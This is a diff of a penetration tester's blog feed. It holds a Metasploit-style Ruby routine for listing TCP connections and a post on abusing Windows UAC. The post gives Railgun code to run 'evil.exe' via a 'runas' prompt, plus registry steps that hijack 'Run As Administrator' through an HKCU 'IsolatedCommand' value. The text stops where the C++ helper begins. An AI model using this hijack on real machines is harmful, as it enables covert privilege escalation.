+		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Indent&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;,
+		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Columns&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;STATE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LHOST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LPORT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;RHOST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;RPORT&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 	)
-	offset = 4
-	(1..entries).each do
-		x = {}
-		x[:state] = case buffer[(offset + 0), 4].unpack(&amp;quot;V*&amp;quot;)[0]
-		when 1
-			&#39;CLOSED&#39;
-		when 2
-			&#39;LISTEN&#39;
-		when 3
-			&#39;SYN_SENT&#39;
-		when 4
-			&#39;SYN_RCVD&#39;
-		when 5
-			&#39;ESTABLISHED&#39;
-		when 6
-			&#39;FIN_WAIT1&#39;
-		when 7
-			&#39;FIN_WAIT2&#39;
-		when 8
-			&#39;CLOSE_WAIT&#39;
-		when 9
-			&#39;CLOSING&#39;
-		when 10
-			&#39;LAST_ACK&#39;
-		when 11
-			&#39;TIME_WAIT&#39;
-		when 12
-			&#39;DELETE_TCB&#39;
-		else
-			&#39;UNDEFINED&#39;
-		end
+	offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+	&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;entries)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+		x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
+		x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:state&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; buffer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;V*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CLOSED&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LISTEN&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SYN_SENT&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SYN_RCVD&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ESTABLISHED&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;FIN_WAIT1&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;FIN_WAIT2&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CLOSE_WAIT&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CLOSING&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LAST_ACK&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;TIME_WAIT&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;when&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
+			&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELETE_TCB&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+			&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UNDEFINED&amp;#39;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
 		
-		x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(&amp;quot;N&amp;quot;)[0])
-		x[:lport] = buffer[(offset + 8), 4].unpack(&amp;quot;n&amp;quot;)[0]
-		x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(&amp;quot;N&amp;quot;)[0])
-		if x[:state] == &amp;quot;LISTEN&amp;quot;
-			x[:rport] = &amp;quot;_&amp;quot;
-		else
-			x[:rport] = buffer[(offset + 16), 4].unpack(&amp;quot;n&amp;quot;)[0]
-		end
+		x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:lhost&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addr_itoa(buffer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
+		x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:lport&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buffer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+		x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:rhost&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addr_itoa(buffer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:state&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LISTEN&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+			x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:rport&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+			x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:rport&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buffer&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
 
-		offset = offset + 20
-		rtable &amp;lt;&amp;lt; [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]]
-	end
+		offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;rtable &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:state&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:lhost&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:lport&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:rhost&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:rport&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
 
-	print_status(rtable.to_s)
-end
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+	print_status(rtable&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_s)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -497,78 +341,63 @@ end
       <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
-      <description>&lt;p&gt;A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At &lt;a href=&#34;http://www.derbycon.com&#34;&gt;DerbyCon&lt;/a&gt; &lt;a href=&#34;http://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85&#34;&gt;ShellExecute windows function&lt;/a&gt;.aspx&amp;rdquo;) via &lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage&#34;&gt;Railgun&lt;/a&gt; with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:&lt;/p&gt;
-
+      <description>&lt;p&gt;A number of times during tests I&#39;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At &lt;a href=&#34;http://www.derbycon.com&#34;&gt;DerbyCon&lt;/a&gt; &lt;a href=&#34;http://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the &lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx%22&#34;&gt;ShellExecute windows function&lt;/a&gt; via &lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage&#34;&gt;Railgun&lt;/a&gt; with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],])
 client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)
 &lt;/code&gt;&lt;/pre&gt;
-
 &lt;p&gt;This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.exe&amp;rsquo; with Administrative privs. If they are not &amp;ldquo;Admins&amp;rdquo; themselves then it would prompt them for the user name and password (normally the case in systems attached to domains). Something to be aware of: If your evil.exe is not code-signed the UAC box will be orange instead of blue. You can get around this a bit by using rundll32.exe (which is signed ;-) ) as is svchost.exe. (You may also want to not name it evil.exe)&lt;/p&gt;
-
-&lt;p&gt;The downfall here is that 1. You have to drop a binary (boooo) 2. You are prompting the user for UAC control when they didn&amp;rsquo;t do anything to cause it. Users are generally as smart as bait, but it&amp;rsquo;s good practice to assume to the contrary. If for nothing else other than to challenge yourself to up your game.&lt;/p&gt;
-
-&lt;p&gt;Number 1 I&amp;rsquo;ll leave to another post, so lets solve #2.&lt;/p&gt;
-
-&lt;p&gt;When a &amp;ldquo;runas&amp;rdquo; ShellExecute (which UAC runs natively #hint#hint) a few registry locations are checked. One I&amp;rsquo;d like to point out is the HKLM\Software\Classes\exefile key. The &amp;lsquo;exefile&amp;rsquo; as should be obvious is the registry settings for executables, and as such tells Windows how to interact with them. In HKLM (which is only writable by Administrators) the &amp;ldquo;shell\open&amp;rdquo;, &amp;ldquo;shell\runas&amp;rdquo; and &amp;ldquo;shell\runasuser&amp;rdquo; subkeys exist (the structure looks oddly familiar to anyone who visited the ShellExecute page more than once). Inside &amp;ldquo;shellopencommand&amp;rdquo; the default string has &amp;ldquo;%1&amp;rdquo; %*  - this basically means execute the binary %1 and hand the arguments given directly to it %*. Awesome! From here you can alter how every EXE runs on the system (don&amp;rsquo;t do it, Windows doesn&amp;rsquo;t like you afterwards, trust me, and remember to snapshot if you don&amp;rsquo;t).&lt;/p&gt;
-
-&lt;p&gt;Great, but how does this help us, we aren&amp;rsquo;t admins. HKCU is writable by the &amp;lsquo;Current User&amp;rsquo; hence the name, and it so happens to have a very similar registry path: HKCU\Software\Classes. Depending on your system, it may or may not have a &amp;ldquo;exefile&amp;rdquo; subkey. If it doesn&amp;rsquo;t it&amp;rsquo;s pretty easy to create. Lets make it match the &amp;ldquo;runas&amp;rdquo; one in HKLM&lt;/p&gt;
-
+&lt;p&gt;The downfall here is that 1. You have to drop a binary (boooo) 2. You are prompting the user for UAC control when they didn&#39;t do anything to cause it. Users are generally as smart as bait, but it&#39;s good practice to assume to the contrary. If for nothing else other than to challenge yourself to up your game.&lt;/p&gt;
+&lt;p&gt;Number 1 I&#39;ll leave to another post, so lets solve #2.&lt;/p&gt;
+&lt;p&gt;When a &amp;ldquo;runas&amp;rdquo; ShellExecute (which UAC runs natively #hint#hint) a few registry locations are checked. One I&#39;d like to point out is the HKLM\Software\Classes\exefile key. The &amp;lsquo;exefile&amp;rsquo; as should be obvious is the registry settings for executables, and as such tells Windows how to interact with them. In HKLM (which is only writable by Administrators) the &amp;ldquo;shell\open&amp;rdquo;, &amp;ldquo;shell\runas&amp;rdquo; and &amp;ldquo;shell\runasuser&amp;rdquo; subkeys exist (the structure looks oddly familiar to anyone who visited the ShellExecute page more than once). Inside &amp;ldquo;shellopencommand&amp;rdquo; the default string has &amp;ldquo;%1&amp;rdquo; %*  - this basically means execute the binary %1 and hand the arguments given directly to it %*. Awesome! From here you can alter how every EXE runs on the system (don&#39;t do it, Windows doesn&#39;t like you afterwards, trust me, and remember to snapshot if you don&#39;t).&lt;/p&gt;
+&lt;p&gt;Great, but how does this help us, we aren&#39;t admins. HKCU is writable by the &amp;lsquo;Current User&amp;rsquo; hence the name, and it so happens to have a very similar registry path: HKCU\Software\Classes. Depending on your system, it may or may not have a &amp;ldquo;exefile&amp;rdquo; subkey. If it doesn&#39;t it&#39;s pretty easy to create. Lets make it match the &amp;ldquo;runas&amp;rdquo; one in HKLM&lt;/p&gt;
 &lt;p&gt;The tree should look something like this when you are done:&lt;/p&gt;
-
 &lt;ul&gt;
 &lt;li&gt;HKLM
-
 &lt;ul&gt;
 &lt;li&gt;Software
-
 &lt;ul&gt;
 &lt;li&gt;Classes
-
 &lt;ul&gt;
 &lt;li&gt;exefile
-
 &lt;ul&gt;
 &lt;li&gt;shell
-
 &lt;ul&gt;
 &lt;li&gt;runas
-
 &lt;ul&gt;
 &lt;li&gt;command&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;p&gt;Under command change the default value to &amp;ldquo;%1&amp;rdquo; %* just as it is in HKLM, and add a new String value called &amp;lsquo;IsolatedCommand&amp;rsquo; with the same value as default. With these settings, very little has changed on the system or its operation. However, if we change the &amp;lsquo;IsolatedCommand&amp;rsquo; String to &amp;lsquo;notepad.exe&amp;rsquo; and attempt to &amp;lsquo;Run As Administrator&amp;rsquo; on that system using any binary guess what happens? Notepad! (as Admin). w00t. Now we can swap in our evil.exe and bob wins right? Sorta. We still have that horrible problem of stealth. Whatever the user was trying to UAC up won&amp;rsquo;t work, and they&amp;rsquo;ll try it again, and start investigating the problem, which we don&amp;rsquo;t want them to do.&lt;/p&gt;
-
-&lt;p&gt;Enter &amp;lsquo;runyou.exe&amp;rsquo;, it&amp;rsquo;s some very simple C++ that weighs in at a whopping 8k when compiled (probably could loose some weight by those who know better compiler options):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;quot;windows.h&amp;quot;
-#include &amp;quot;stdio.h&amp;quot;
-#include &amp;quot;tchar.h&amp;quot;
-
-int _tmain(int argc, _TCHAR* argv[])
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Under command change the default value to &amp;ldquo;%1&amp;rdquo; %* just as it is in HKLM, and add a new String value called &amp;lsquo;IsolatedCommand&amp;rsquo; with the same value as default. With these settings, very little has changed on the system or its operation. However, if we change the &amp;lsquo;IsolatedCommand&amp;rsquo; String to &amp;lsquo;notepad.exe&amp;rsquo; and attempt to &amp;lsquo;Run As Administrator&amp;rsquo; on that system using any binary guess what happens? Notepad! (as Admin). w00t. Now we can swap in our evil.exe and bob wins right? Sorta. We still have that horrible problem of stealth. Whatever the user was trying to UAC up won&#39;t work, and they&#39;ll try it again, and start investigating the problem, which we don&#39;t want them to do.&lt;/p&gt;
+&lt;p&gt;Enter &amp;lsquo;runyou.exe&amp;rsquo;, it&#39;s some very simple C++ that weighs in at a whopping 8k when compiled (probably could loose some weight by those who know better compiler options):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;windows.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
